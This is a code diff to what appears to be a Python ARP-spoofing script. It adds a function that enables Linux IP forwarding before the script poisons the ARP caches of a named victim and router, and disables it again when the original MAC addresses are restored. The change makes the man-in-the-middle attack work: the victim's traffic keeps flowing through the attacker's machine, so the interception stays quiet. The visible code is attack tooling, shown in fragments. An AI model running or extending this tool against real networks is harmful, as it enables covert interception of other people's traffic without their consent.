@@ -35,6 +35,14 @@ def get_ip_mac_map(ip_list):
     return ip_to_mac_map
 
 
+def set_ip_forwarding(ip_forwarding):
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+        if ip_forwarding:
+            ipf.write('1\n')
+        else:
+            ipf.write('0\n')
+
+
 def arp_spoof(ip1, ip2, mac, interval=10):
     print("ARP Poisoning {} and {} with mac: {}".format(ip1, ip2, mac))
     while 1:
@@ -63,6 +71,7 @@ if __name__ == '__main__':
     print("Victim ({}) mac: {}".format(victim_ip, original_macs[victim_ip]))
     print("Router ({}) mac: {}".format(router_ip, original_macs[router_ip]))
 
+    set_ip_forwarding(True)
     try:
         arp_spoof(router_ip, victim_ip, mac)
     except KeyboardInterrupt:
@@ -70,5 +79,6 @@ if __name__ == '__main__':
         print("Restoring original macs...")
         arp_reply(router_ip, victim_ip, original_macs[victim_ip])
         arp_reply(victim_ip, router_ip, original_macs[router_ip])
+        set_ip_forwarding(False)
         print("Done")
 
